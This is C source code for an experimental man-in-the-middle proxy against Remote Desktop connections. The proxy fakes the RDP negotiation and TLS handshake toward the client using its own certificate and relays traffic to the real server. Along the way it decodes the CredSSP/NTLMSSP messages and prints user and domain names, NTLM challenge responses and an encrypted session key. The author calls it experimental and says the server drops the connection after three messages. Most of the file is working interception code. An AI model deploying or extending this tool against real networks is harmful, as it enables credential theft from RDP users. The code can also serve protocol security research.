/* -*- c-basic-offset: 8 -*-
   rdp_mitm: A Man-In-The-Middle Proxy for Remote Desktop using TLS and NTLMSSP

   Copyright (C) Marc-Andre Moreau <marcandre.moreau@gmail.com> 2009

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
*/

/*
	This program is experimental and prone to errors. It was used with both a client
	and server running on Windows Server 2008 R2. It can currently decrypt the first
	three messages exchanged by the client and server, and then the server disconnects
	the client. In my case, the client and server negotiate to use NTLMSSP, but it may
	also be the case that negotiation leads to usage of Kerberos. My guess about the
	server disconnection is that NTLMSSP uses sends information regarding the client
	or the server that doesn't match anymore because of the proxying. In the very worst
	case, the proxy could fully authenticate using NTLMSSP and re-authenticate with the
	real server after. This may require the proxy to know in advance the real password.
*/

#include "rdesktop.h"
#include "mem.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#include "TSRequest.h"
#include "NegotiationToken.h"

#define BUFFER_SIZE	65536

int srcfd;
int dstfd;
int sockfd;
int maxfd;
int ofcmode;
fd_set readfds;
fd_set writefds;

SSL *sslSrc;
SSL *sslDst;
SSL_CTX *ctxSrc;
SSL_CTX *ctxDst;
BIO *bioSrc;
BIO *bioDst;

int n;
int size;
int total;
int listeningPort;
int serverPort;
char srcIP[25];
char dstIP[25];
int inSrcBuffer;
int inDstBuffer;
char buffer[BUFFER_SIZE];
char srcBuffer[BUFFER_SIZE];
char dstBuffer[BUFFER_SIZE];
struct sockaddr_in addr;
struct sockaddr_in srcAddr;
struct sockaddr_in dstAddr;
socklen_t addrSize;

asn_dec_rval_t rval;
TSRequest_t *ts_request;
NegotiationToken_t *nego_token;

unsigned char clientInitial[] =
	"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00";

unsigned char serverInitial[] =
	"\x03\x00\x00\x13\x0e\xd0\x00\x00\x12\x34\x00\x02\x00\x08\x00\x02\x00\x00\x00";

typedef struct _NEGOTIATE
{
	uint32 flags;
	uint8 NTLMSSP_NEGOTIATE_56;
	uint8 NTLMSSP_NEGOTIATE_KEY_EXCH;
	uint8 NTLMSSP_NEGOTIATE_128;
	uint8 NTLMSSP_NEGOTIATE_VERSION;
	uint8 NTLMSSP_NEGOTIATE_TARGET_INFO;
	uint8 NTLMSSP_REQUEST_NON_NT_SESSION_KEY;
	uint8 NTLMSSP_NEGOTIATE_IDENTIFY;
	uint8 NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY;
	uint8 NTLMSSP_TARGET_TYPE_SHARE;
	uint8 NTLMSSP_TARGET_TYPE_SERVER;
	uint8 NTLMSSP_TARGET_TYPE_DOMAIN;
	uint8 NTLMSSP_NEGOTIATE_ALWAYS_SIGN;
	uint8 NTLMSSP_NEGOTIATE_OEM_WORKSTATION_SUPPLIED;
	uint8 NTLMSSP_NEGOTIATE_OEM_DOMAIN_SUPPLIED;
	uint8 NTLMSSP_NEGOTIATE_NT_ONLY;
	uint8 NTLMSSP_NEGOTIATE_NTLM;
	uint8 NTLMSSP_NEGOTIATE_LM_KEY;
	uint8 NTLMSSP_NEGOTIATE_DATAGRAM;
	uint8 NTLMSSP_NEGOTIATE_SEAL;
	uint8 NTLMSSP_NEGOTIATE_SIGN;
	uint8 NTLMSSP_REQUEST_TARGET;
	uint8 NTLMSSP_NEGOTIATE_OEM;
	uint8 NTLMSSP_NEGOTIATE_UNICODE;
}
NEGOTIATE;

void print_wstr(char* bytes, int length);
void print_hexdump(char* bytes, int length);
void ntlm_recv_negotiate_message(STREAM s);
void ntlm_recv_challenge_message(STREAM s);
void ntlm_recv_authenticate_message(STREAM s);
void ntlm_recv_negotiate_flags(STREAM s, NEGOTIATE* negotiate);

void ntlm_recv_negotiate_flags(STREAM s, NEGOTIATE* negotiate)
{
	in_uint32_be(s, negotiate->flags);

	negotiate->NTLMSSP_NEGOTIATE_56 = negotiate->flags >> 0 & 1;
	negotiate->NTLMSSP_NEGOTIATE_KEY_EXCH = negotiate->flags >> 1 & 1;
	negotiate->NTLMSSP_NEGOTIATE_128 = negotiate->flags >> 2 & 1;
	negotiate->NTLMSSP_NEGOTIATE_VERSION = negotiate->flags >> 6 & 1;
	negotiate->NTLMSSP_NEGOTIATE_TARGET_INFO = negotiate->flags >> 8 & 1;
	negotiate->NTLMSSP_REQUEST_NON_NT_SESSION_KEY = negotiate->flags >> 9 & 1;
	negotiate->NTLMSSP_NEGOTIATE_IDENTIFY = negotiate->flags >> 11 & 1;
	negotiate->NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY = negotiate->flags >> 12 & 1;
	negotiate->NTLMSSP_TARGET_TYPE_SHARE = negotiate->flags >> 13 & 1;
	negotiate->NTLMSSP_TARGET_TYPE_SERVER = negotiate->flags >> 14 & 1;
	negotiate->NTLMSSP_TARGET_TYPE_DOMAIN = negotiate->flags >> 15 & 1;
	negotiate->NTLMSSP_NEGOTIATE_ALWAYS_SIGN = negotiate->flags >> 16 & 1;
	negotiate->NTLMSSP_NEGOTIATE_OEM_WORKSTATION_SUPPLIED = negotiate->flags >> 18 & 1;
	negotiate->NTLMSSP_NEGOTIATE_OEM_DOMAIN_SUPPLIED = negotiate->flags >> 19 & 1;
	negotiate->NTLMSSP_NEGOTIATE_NT_ONLY = negotiate->flags >> 21 & 1;
	negotiate->NTLMSSP_NEGOTIATE_NTLM = negotiate->flags >> 22 & 1;
	negotiate->NTLMSSP_NEGOTIATE_LM_KEY = negotiate->flags >> 24 & 1;
	negotiate->NTLMSSP_NEGOTIATE_DATAGRAM = negotiate->flags >> 25 & 1;
	negotiate->NTLMSSP_NEGOTIATE_SEAL = negotiate->flags >> 26 & 1;
	negotiate->NTLMSSP_NEGOTIATE_SIGN = negotiate->flags >> 27 & 1;
	negotiate->NTLMSSP_REQUEST_TARGET = negotiate->flags >> 29 & 1;
	negotiate->NTLMSSP_NEGOTIATE_OEM = negotiate->flags >> 30 & 1;
	negotiate->NTLMSSP_NEGOTIATE_UNICODE = negotiate->flags >> 31 & 1;

	if(negotiate->NTLMSSP_NEGOTIATE_56)
		printf("NTLMSSP_NEGOTIATE_56\n");
	if(negotiate->NTLMSSP_NEGOTIATE_KEY_EXCH)
		printf("NTLMSSP_NEGOTIATE_KEY_EXCH\n");
	if(negotiate->NTLMSSP_NEGOTIATE_128)
		printf("NTLMSSP_NEGOTIATE_128\n");
	if(negotiate->NTLMSSP_NEGOTIATE_VERSION)
		printf("NTLMSSP_NEGOTIATE_VERSION\n");
	if(negotiate->NTLMSSP_NEGOTIATE_TARGET_INFO)
		printf("NTLMSSP_NEGOTIATE_TARGET_INFO\n");
	if(negotiate->NTLMSSP_REQUEST_NON_NT_SESSION_KEY)
		printf("NTLMSSP_REQUEST_NON_NT_SESSION_KEY\n");
	if(negotiate->NTLMSSP_NEGOTIATE_IDENTIFY)
		printf("NTLMSSP_NEGOTIATE_IDENTIFY\n");
	if(negotiate->NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY)
		printf("NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY\n");
	if(negotiate->NTLMSSP_TARGET_TYPE_SHARE)
		printf("NTLMSSP_TARGET_TYPE_SHARE\n");
	if(negotiate->NTLMSSP_TARGET_TYPE_SERVER)
		printf("NTLMSSP_TARGET_TYPE_SERVER\n");
	if(negotiate->NTLMSSP_TARGET_TYPE_DOMAIN)
		printf("NTLMSSP_TARGET_TYPE_DOMAIN\n");
	if(negotiate->NTLMSSP_NEGOTIATE_ALWAYS_SIGN)
		printf("NTLMSSP_NEGOTIATE_ALWAYS_SIGN\n");
	if(negotiate->NTLMSSP_NEGOTIATE_OEM_WORKSTATION_SUPPLIED)
		printf("NTLMSSP_NEGOTIATE_OEM_WORKSTATION_SUPPLIED\n");
	if(negotiate->NTLMSSP_NEGOTIATE_OEM_DOMAIN_SUPPLIED)
		printf("NTLMSSP_NEGOTIATE_OEM_DOMAIN_SUPPLIED\n");
	if(negotiate->NTLMSSP_NEGOTIATE_NT_ONLY)
		printf("NTLMSSP_NEGOTIATE_NT_ONLY\n");
	if(negotiate->NTLMSSP_NEGOTIATE_NTLM)
		printf("NTLMSSP_NEGOTIATE_NTLM\n");
	if(negotiate->NTLMSSP_NEGOTIATE_LM_KEY)
		printf("NTLMSSP_NEGOTIATE_LM_KEY\n");
	if(negotiate->NTLMSSP_NEGOTIATE_DATAGRAM)
		printf("NTLMSSP_NEGOTIATE_DATAGRAM\n");
	if(negotiate->NTLMSSP_NEGOTIATE_SEAL)
		printf("NTLMSSP_NEGOTIATE_SEAL\n");
	if(negotiate->NTLMSSP_NEGOTIATE_SIGN)
		printf("NTLMSSP_NEGOTIATE_SIGN\n");
	if(negotiate->NTLMSSP_REQUEST_TARGET)
		printf("NTLMSSP_REQUEST_TARGET\n");
	if(negotiate->NTLMSSP_NEGOTIATE_OEM)
		printf("NTLMSSP_NEGOTIATE_OEM\n");
	if(negotiate->NTLMSSP_NEGOTIATE_UNICODE)
		printf("NTLMSSP_NEGOTIATE_UNICODE\n");
}

void ntlmssp_recv(STREAM s)
{
	char signature[8]; /* Signature, "NTLMSSP" */
	uint32 messageType; /* MessageType */

	in_uint8a(s, signature, 8);
	printf("Signature: %s\n", signature);
	in_uint32_le(s, messageType);

	printf("Message Type: %X\n", messageType);
	switch (messageType)
	{
		/* NEGOTIATE_MESSAGE */
		case 0x00000001:
			printf("NEGOTIATE_MESSAGE\n");
			ntlm_recv_negotiate_message(s);
			break;

		/* CHALLENGE_MESSAGE */
		case 0x00000002:
			printf("CHALLENGE_MESSAGE\n");
			ntlm_recv_challenge_message(s);
			break;

		/* AUTHENTICATE_MESSAGE */
		case 0x00000003:
			printf("AUTHENTICATE_MESSAGE\n");
			ntlm_recv_authenticate_message(s);
			break;
	}
}

void ntlm_recv_negotiate_message(STREAM s)
{
	/* A NEGOTIATE data structure */
	NEGOTIATE negotiateFlags;

	/* DomainNameFields (8 bytes) */
	uint16 domainNameLen;
	uint16 domainNameMaxLen;
	uint32 domainNameBufferOffset;

	/* WorkstationFields (8 bytes) */
	uint16 workstationLen;
	uint16 workstationMaxLen;
	uint32 workstationBufferOffset;

	/* Payload */
	char* domainName = NULL;
	char* workstationName = NULL;

	ntlm_recv_negotiate_flags(s, &negotiateFlags);

	in_uint16_le(s, domainNameLen);
	in_uint16_le(s, domainNameMaxLen);
	in_uint32_le(s, domainNameBufferOffset);

	in_uint16_le(s, workstationLen);
	in_uint16_le(s, workstationMaxLen);
	in_uint16_le(s, workstationBufferOffset);

	/* Version, VERSION data structure (8 bytes) */
	/* [MS-NLMP] says it should be ignored */
	in_uint8s(s, 8); /* Skip */

	if(negotiateFlags.NTLMSSP_NEGOTIATE_OEM_DOMAIN_SUPPLIED)
	{
		domainName = xmalloc(domainNameLen);
		s->p = s->data + domainNameBufferOffset;
		in_uint8a(s, domainName, domainNameLen);
		printf("Domain name: ");
		print_wstr(domainName, domainNameLen);
		printf("\n");
	}

	if(negotiateFlags.NTLMSSP_NEGOTIATE_OEM_WORKSTATION_SUPPLIED)
	{
		workstationName = xmalloc(workstationLen);
		s->p = s->data + workstationBufferOffset;
		in_uint8a(s, workstationName, workstationLen);
		printf("Workstation name: ");
		print_wstr(workstationName, workstationLen);
		printf("\n");
	}

	if(domainName != NULL)
		xfree(domainName);

	if(workstationName != NULL)
		xfree(workstationName);
}

void ntlm_recv_challenge_message(STREAM s)
{

	/* TargetNameFields (8 bytes) */
	uint16 targetNameLen;
	uint16 targetNameMaxLen;
	uint32 targetNameBufferOffset;

	NEGOTIATE negotiateFlags; /* A NEGOTIATE data structure */
	uint8 serverChallenge[8]; /* 64-byte value containing NTLM challenge */

	/* TargetInfoFields (8 bytes) */
	uint16 targetInfoLen;
	uint16 targetInfoMaxLen;
	uint32 targetInfoBufferOffset;

	/* Payload */
	char* targetName = NULL;
	char* targetInfo = NULL;

	in_uint16_le(s, targetNameLen);
	in_uint16_le(s, targetNameMaxLen);
	in_uint32_le(s, targetNameBufferOffset);

	ntlm_recv_negotiate_flags(s, &negotiateFlags);
	in_uint8a(s, serverChallenge, 8);
	in_uint8s(s, 8); /* Reserved */

	printf("Server Challenge:\n");
	print_hexdump(serverChallenge, 8);

	in_uint16_le(s, targetInfoLen);
	in_uint16_le(s, targetInfoMaxLen);
	in_uint32_le(s, targetInfoBufferOffset);

	/* Version, VERSION data structure (8 bytes) */
	/* [MS-NLMP] says it should be ignored */
	in_uint8s(s, 8); /* Skip */

	if(negotiateFlags.NTLMSSP_REQUEST_TARGET)
	{
		targetName = xmalloc(targetNameLen);
		s->p = s->data + targetNameBufferOffset;
		in_uint8a(s, targetName, targetNameLen);
		printf("Target name: ");
		print_wstr(targetName, targetNameLen);
		printf("\n");
	}

	if(negotiateFlags.NTLMSSP_NEGOTIATE_TARGET_INFO)
	{
		targetInfo = xmalloc(targetInfoLen);
		s->p = s->data + targetInfoBufferOffset;
		in_uint8a(s, targetInfo, targetInfoLen);
		printf("Target info: %s\n", targetInfo);
	}

	if(targetName != NULL)
		xfree(targetName);

	if(targetInfo != NULL)
		xfree(targetInfo);
}

void ntlm_recv_authenticate_message(STREAM s)
{
	/* LmChallengeResponseFields */
	uint16 lmChallengeResponseLen;
	uint16 lmChallengeResponseMaxLen;
	uint32 lmChallengeResponseBufferOffset;

	/* NtChallengeResponseFields */
	uint16 ntChallengeResponseLen;
	uint16 ntChallengeResponseMaxLen;
	uint32 ntChallengeResponseBufferOffset;

	/* DomainNameFields */
	uint16 domainNameLen;
	uint16 domainNameMaxLen;
	uint32 domainNameBufferOffset;

	/* UserNameFields */
	uint16 userNameLen;
	uint16 userNameMaxLen;
	uint32 userNameBufferOffset;

	/* WorkstationFields */
	uint16 workstationLen;
	uint16 workstationMaxLen;
	uint32 workstationBufferOffset;

	/* EncryptedRandomSessionKeyFields */
	uint16 encryptedRandomSessionKeyLen;
	uint16 encryptedRandomSessionKeyMaxLen;
	uint32 encryptedRandomSessionKeyBufferOffset;

	NEGOTIATE negotiateFlags;

	/* Payload */
	char* lmChallengeResponse = NULL;
	char* ntChallengeResponse = NULL;
	char* domainName = NULL;
	char* userName = NULL;
	char* workstationName = NULL;
	char* encryptedRandomSessionKey = NULL;

	in_uint16_le(s, lmChallengeResponseLen);
	in_uint16_le(s, lmChallengeResponseMaxLen);
	in_uint32_le(s, lmChallengeResponseBufferOffset);

	in_uint16_le(s, ntChallengeResponseLen);
	in_uint16_le(s, ntChallengeResponseMaxLen);
	in_uint32_le(s, ntChallengeResponseBufferOffset);

	in_uint16_le(s, domainNameLen);
	in_uint16_le(s, domainNameMaxLen);
	in_uint32_le(s, domainNameBufferOffset);

	in_uint16_le(s, userNameLen);
	in_uint16_le(s, userNameMaxLen);
	in_uint32_le(s, userNameBufferOffset);

	in_uint16_le(s, workstationLen);
	in_uint16_le(s, workstationMaxLen);
	in_uint16_le(s, workstationBufferOffset);

	in_uint16_le(s, encryptedRandomSessionKeyLen);
	in_uint16_le(s, encryptedRandomSessionKeyMaxLen);
	in_uint16_le(s, encryptedRandomSessionKeyBufferOffset);

	ntlm_recv_negotiate_flags(s, &negotiateFlags);
	in_uint8s(s, 8); /* Version */
	in_uint8s(s, 16); /* MIC */

	/* Payload */

	if(lmChallengeResponseLen > 0 && lmChallengeResponseMaxLen > 0)
	{
		lmChallengeResponse = xmalloc(lmChallengeResponseLen);
		s->p = s->data + lmChallengeResponseBufferOffset;
		in_uint8a(s, lmChallengeResponse, lmChallengeResponseLen);
		printf("lmChallengeResponse: %s\n", lmChallengeResponse);
	}

	if(ntChallengeResponseLen > 0 && ntChallengeResponseMaxLen > 0)
	{
		ntChallengeResponse = xmalloc(ntChallengeResponseLen);
		s->p = s->data + ntChallengeResponseBufferOffset;
		in_uint8a(s, ntChallengeResponse, 16);
		printf("---ntChallengeResponse---\n");
		print_hexdump(ntChallengeResponse, 16);

	}

	if(negotiateFlags.NTLMSSP_NEGOTIATE_OEM_DOMAIN_SUPPLIED)
	{
		domainName = xmalloc(domainNameLen);
		s->p = s->data + domainNameBufferOffset;
		in_uint8a(s, domainName, domainNameLen);
		printf("Domain name: %s\n", domainName);
	}

	if(userNameLen > 0 && userNameMaxLen > 0)
	{
		userName = xmalloc(userNameLen);
		s->p = s->data + userNameBufferOffset;
		in_uint8a(s, userName, userNameLen);
		printf("User name: ");
		print_wstr(userName, userNameLen);
		printf("\n");
	}

	if(negotiateFlags.NTLMSSP_NEGOTIATE_OEM_WORKSTATION_SUPPLIED)
	{
		workstationName = xmalloc(workstationLen);
		s->p = s->data + workstationBufferOffset;
		in_uint8a(s, workstationName, workstationLen);
		printf("Workstation name: %s\n", workstationName);
	}

	if(encryptedRandomSessionKeyLen > 0 && encryptedRandomSessionKeyMaxLen > 0)
	{
		encryptedRandomSessionKey = xmalloc(encryptedRandomSessionKeyLen);
		s->p = s->data + encryptedRandomSessionKeyBufferOffset;
		in_uint8a(s, encryptedRandomSessionKey, encryptedRandomSessionKeyLen);
		printf("encryptedRandomSessionKey: %s\n", encryptedRandomSessionKey);
	}

	if(lmChallengeResponse != NULL)
		xfree(lmChallengeResponse);

	if(ntChallengeResponse != NULL)
		xfree(ntChallengeResponse);

	if(domainName != NULL)
		xfree(domainName);

	if(userName != NULL)
		xfree(userName);

	if(workstationName != NULL)
		xfree(workstationName);

	if(encryptedRandomSessionKey != NULL)
		xfree(encryptedRandomSessionKey);
}

void decode_ts_request(char* bytes, int length)
{
	ts_request = 0;
	rval = asn_DEF_TSRequest.ber_decoder(0, &asn_DEF_TSRequest, (void **)&ts_request, bytes, length, 0);

	if(rval.code == RC_OK)
	{
		int i;
		asn_fprint(stdout, &asn_DEF_TSRequest, ts_request);

		for(i = 0; i < ts_request->negoTokens->list.count; i++)
		{
			STREAM s = xmalloc(sizeof(struct stream));
			nego_token = 0;

			rval = asn_DEF_NegotiationToken.ber_decoder(0, &asn_DEF_NegotiationToken, (void **)&nego_token,
				ts_request->negoTokens->list.array[i]->negoToken.buf,
				ts_request->negoTokens->list.array[i]->negoToken.size, 0);

			printf("----------------------NegotiationToken-------------------\n");
			print_hexdump(ts_request->negoTokens->list.array[i]->negoToken.buf, ts_request->negoTokens->list.array[i]->negoToken.size);
			printf("---------------------------------------------------------\n");

			s->data = (unsigned char*)(ts_request->negoTokens->list.array[i]->negoToken.buf);
			s->size = ts_request->negoTokens->list.array[i]->negoToken.size;
			s->p = s->data;
			s->end = s->p + s->size;

			ntlmssp_recv(s);
			xfree(s);
		}
	}
	else
	{
		printf("Failed to decode TSRequest\n");
		asn_DEF_TSRequest.free_struct(&asn_DEF_TSRequest, ts_request, 0);
	}
}

void print_hexdump(char* bytes, int length)
{
	int i;
	int j;
	int k;
	int lineLength;
	unsigned char b;

	lineLength = 16;

	for(i = 0; i < length; i += k)
	{
		k = (lineLength < (length - i)) ? lineLength : (length - i);

		for(j = 0; j < lineLength; j++)
		{
			if(j < k)
			{
				b = (unsigned char)bytes[i + j];
				printf("%02X ", b);
			}
			else
				printf("   ");
		}
		printf("       ");

		for(j = 0; j < k; j++)
		{
			if(j < k)
			{
				b = (unsigned char)bytes[i + j];

				if(b > 31 && b < 128)
					printf("%c", b);
				else
					printf(".");
			}
			else
				printf(" ");
		}
		printf("\n");
	}
}

void print_wstr(char* bytes, int length)
{
	int i;
	unsigned char b;

	for(i = 0; i < length; i += 2)
	{
		b = (unsigned char)bytes[i];
		printf("%c", b);
	}
}

int tls_read_record(SSL* ssl, char* b, int size)
{
	int bytesRead = 0;

	n = SSL_read(ssl, b, size);

	switch(SSL_get_error(ssl, n))
	{
		case SSL_ERROR_NONE:
			printf("read %d bytes\n", n);
			print_hexdump(b, n);
			bytesRead += n;
			break;

		case SSL_ERROR_ZERO_RETURN:
			printf("Connection with was closed\n");
			exit(0);
			break;

		case SSL_ERROR_WANT_READ:
			printf("SSL_ERROR_WANT_READ\n");
			bytesRead += tls_read_record(ssl, &b[bytesRead], size - bytesRead);
			break;

		case SSL_ERROR_WANT_WRITE:
			printf("SSL_ERROR_WANT_WRITE\n");
			break;

		case SSL_ERROR_WANT_CONNECT:
			printf("SSL_ERROR_WANT_CONNECT\n");
			break;

		case SSL_ERROR_WANT_ACCEPT:
			printf("SSL_ERROR_WANT_ACCEPT\n");
			break;

		case SSL_ERROR_WANT_X509_LOOKUP:
			printf("SSL_ERROR_WANT_X509_LOOKUP\n");
			break;

		case SSL_ERROR_SYSCALL:
			printf("SSL_ERROR_SYSCALL\n");
			ERR_print_errors_fp(stdout);
			exit(0);
			break;

		case SSL_ERROR_SSL:
			printf("SSL_ERROR_SSL\n");
			ERR_print_errors_fp(stdout);
			break;

		default:
			printf("SSL_ERROR_UNKNOWN\n");
			ERR_print_errors_fp(stdout);
			break;
	}

	return bytesRead;
}

int tls_write_record(SSL* ssl, char* b, int size)
{
	int bytesWritten = 0;
	n = SSL_write(ssl, b, size);

	switch(SSL_get_error(ssl, n))
	{
		case SSL_ERROR_NONE:
			//printf("Wrote %d bytes\n", n);
			//print_hexdump(b, n);
			bytesWritten += n;
			break;

		case SSL_ERROR_ZERO_RETURN:
			printf("Connection with was closed\n");
			exit(0);
			break;

		case SSL_ERROR_WANT_READ:
			printf("SSL_ERROR_WANT_READ\n");
			break;

		case SSL_ERROR_WANT_WRITE:
			printf("SSL_ERROR_WANT_WRITE\n");
			break;

		case SSL_ERROR_WANT_CONNECT:
			printf("SSL_ERROR_WANT_CONNECT\n");
			break;

		case SSL_ERROR_WANT_ACCEPT:
			printf("SSL_ERROR_WANT_ACCEPT\n");
			break;

		case SSL_ERROR_WANT_X509_LOOKUP:
			printf("SSL_ERROR_WANT_X509_LOOKUP\n");
			break;

		case SSL_ERROR_SYSCALL:
			printf("SSL_ERROR_SYSCALL\n");
			ERR_print_errors_fp(stdout);
			exit(0);
			break;

		case SSL_ERROR_SSL:
			printf("SSL_ERROR_SSL\n");
			ERR_print_errors_fp(stdout);
			break;

		default:
			printf("SSL_ERROR_UNKNOWN\n");
			ERR_print_errors_fp(stdout);
			break;
	}

	if(bytesWritten < size)
		return bytesWritten += tls_write_record(ssl, &b[bytesWritten], size - bytesWritten);
	else
		return bytesWritten;
}

int main(int argc, char* argv[])
{
	if(argc < 4)
	{
		printf("Usage: ./server <listening port> <server address> <server port>\n");
		exit(0);
	}
	else
	{
		listeningPort = atoi(argv[1]);
		snprintf(dstIP, sizeof(dstIP), "%s", argv[2]);
		serverPort = atoi(argv[3]);
	}

	addrSize = sizeof(struct sockaddr);

	/* Create listening socket */
	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	if(sockfd < 0)
	{
		printf("socket() error\n");
		exit(0);
	}

	addr.sin_family = AF_INET;
	addr.sin_port = htons(listeningPort);
	addr.sin_addr.s_addr = INADDR_ANY;
	memset(&(addr.sin_zero), '\0', 8);

	if(bind(sockfd, (struct sockaddr*)&addr, sizeof(struct sockaddr)) == -1)
	{
		printf("bind() error\n");
		exit(0);
	}

	if(listen(sockfd, 10) == -1)
	{
		printf("listen() error\n");
		exit(0);
	}

	/* Accept incoming connection from source */
	srcfd = accept(sockfd, (struct sockaddr*)&srcAddr, &addrSize);

	snprintf(srcIP, sizeof(srcIP), "%s", inet_ntoa(srcAddr.sin_addr));

	printf("Got connection from %s\n", srcIP);

	/* Fake RDP encryption negotiation with source */

	/* Receive client initial */
	n = recv(srcfd, buffer, BUFFER_SIZE, 0);
	printf("Received RDP client initial from source\n");
	print_hexdump(buffer, n);

	/* Send server initial */
	n = send(srcfd, serverInitial, sizeof(serverInitial) - 1, 0);
	printf("Sent RDP server initial to source\n");
	print_hexdump(serverInitial, n);

	/* Initialize OpenSSL */
	SSL_load_error_strings();
	SSL_library_init();

	bioSrc = BIO_new_socket(srcfd, BIO_NOCLOSE);

	ctxSrc = SSL_CTX_new(TLSv1_server_method());

	if(ctxSrc == NULL)
	{
		printf("SSL_CTX_new() error\n");
		exit(0);
	}

	SSL_CTX_set_options(ctxSrc, SSL_OP_ALL);
	SSL_CTX_set_options(ctxSrc, SSL_OP_NO_TICKET);

	if(SSL_CTX_use_RSAPrivateKey_file(ctxSrc, "server.key", SSL_FILETYPE_PEM) <= 0)
	{
		printf("SSL_CTX_use_RSAPrivateKey_file() error\n");
	}

	sslSrc = SSL_new(ctxSrc);

	if(SSL_use_certificate_file(sslSrc, "server.crt", SSL_FILETYPE_PEM) <= 0)
	{
		printf("SSL_use_certificate_file() error\n");
	}

	if (sslSrc == NULL)
	{
		printf("SSL_new() Error\n");
		exit(0);
	}

	SSL_set_bio(sslSrc, bioSrc, bioSrc);

	if(SSL_accept(sslSrc) <= 0)
	{
		printf("SSL_accept() Error\n");
		exit(0);
	}
	else
	{
		printf("TLS connection established with source\n");
	}

	/* Create destination socket */
	dstfd = socket(AF_INET, SOCK_STREAM, 0);

	if(dstfd < 0)
	{
		printf("socket() error");
		exit(0);
	}

	dstAddr.sin_family = AF_INET;
	dstAddr.sin_port = htons(serverPort);
	inet_pton(AF_INET, dstIP, &dstAddr.sin_addr);
	memset(&(dstAddr.sin_zero), '\0', 8);

	/* Connection to destination */
	if(connect(dstfd, (struct sockaddr*)&dstAddr, addrSize) < 0)
	{
		printf("Error: Could not connect to %s on port %d\n", dstIP, serverPort);
		exit(0);
	}
	else
	{
		printf("Connected to %s on port %d\n", dstIP, serverPort);
	}

	/* Fake RDP encryption negotiation with destination */

	/* Send client initial */
	n = send(dstfd, clientInitial, sizeof(clientInitial) - 1, 0);
	printf("Sent RDP client initial to destination\n");
	print_hexdump(buffer, n);

	/* Receive server initial */
	n = recv(dstfd, buffer, BUFFER_SIZE, 0);
	printf("Received RDP server initial from destination\n");
	print_hexdump(buffer, n);

	/* Create destination TLS context */
	ctxDst = SSL_CTX_new(TLSv1_client_method());

	if(ctxDst == NULL)
	{
		printf("SSL_CTX_new() error\n");
		exit(0);
	}

	SSL_CTX_set_options(ctxDst, SSL_OP_ALL);
	SSL_CTX_set_options(ctxDst, SSL_OP_NO_TICKET);
	SSL_CTX_set_options(ctxDst, SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION);

	sslDst = SSL_new(ctxDst);

	if(sslDst == NULL)
	{
		printf("SSL_new() Error\n");
		exit(0);
	}

	bioDst = BIO_new_socket(dstfd, BIO_NOCLOSE);

	SSL_set_bio(sslDst, bioDst, bioDst);

	if(SSL_connect(sslDst) <= 0)
	{
		printf("SSL_connect() error\n");
		exit(0);
	}
	{
		printf("TLS connection established with destination\n");
	}

	/* Set srcfd non-blocking */
	ofcmode = fcntl(srcfd, F_GETFL, 0);
	ofcmode |= O_NDELAY;

	if(fcntl(srcfd, F_SETFL, ofcmode))
	{
		printf("Couldn't set srcfd as non-blocking\n");
		exit(0);
	}

	/* Set dstfd non-blocking */
	ofcmode = fcntl(dstfd, F_GETFL, 0);
	ofcmode |= O_NDELAY;

	if(fcntl(dstfd, F_SETFL, ofcmode))
	{
		printf("Couldn't set srcfd as non-blocking\n");
		exit(0);
	}

	inSrcBuffer = 0;
	inDstBuffer = 0;
	maxfd = (srcfd > dstfd) ? srcfd : dstfd;

	/*
	 * CredSSP Negotiation Sequence (on top of TLS)
	 *
	 * CredSSP Client ----------------------------------------------------- CredSSP Server
	 *       |                                                                    |
	 *       |--------------------TSRequest[SPNEGO Token])---------------------->>|
	 *       |<<------------------TSRequest[SPNEGO Token])------------------------|
	 *       |--------TSRequest[SPNEGO encrypted(server's public key)])--------->>|
	 *       |<<------TSRequest[SPNEGO encrypted(server's public key + 1)])-------|
	 *       |-----------TSRequest[SPNEGO encrypted(user credentials)])--------->>|
	 *       |                                                                    |
	 *
	 */

	while (1)
	{
		FD_ZERO(&readfds);

		FD_SET(srcfd, &readfds);
		FD_SET(dstfd, &readfds);

		if(select(maxfd + 1, &readfds, NULL, NULL, NULL) == 0)
			continue;

		if(FD_ISSET(srcfd, &readfds))
		{
			printf("srcfd readable\n");
			inSrcBuffer = tls_read_record(sslSrc, srcBuffer, BUFFER_SIZE);

			decode_ts_request(srcBuffer, inSrcBuffer);
		}
		if(FD_ISSET(dstfd, &readfds))
		{
			printf("dstfd readable\n");
			inDstBuffer = tls_read_record(sslDst, dstBuffer, BUFFER_SIZE);

			decode_ts_request(dstBuffer, inDstBuffer);
		}

		FD_ZERO(&writefds);

		FD_SET(srcfd, &writefds);
		FD_SET(dstfd, &writefds);

		if(select(maxfd + 1, NULL, &writefds, NULL, NULL) == 0)
			continue;

		if(FD_ISSET(srcfd, &writefds) && inDstBuffer > 0)
		{
			printf("srcfd writable\n");
			tls_write_record(sslSrc, dstBuffer, inDstBuffer);
			inDstBuffer = 0;
		}
		if(FD_ISSET(dstfd, &writefds) && inSrcBuffer > 0)
		{
			printf("dstfd writable\n");
			tls_write_record(sslDst, srcBuffer, inSrcBuffer);
			inSrcBuffer = 0;
		}
	}

	SSL_shutdown(sslSrc);
	SSL_shutdown(sslDst);
	SSL_free(sslSrc);
	SSL_free(sslDst);

	close(sockfd);
	close(srcfd);
	close(dstfd);

	return 0;
}

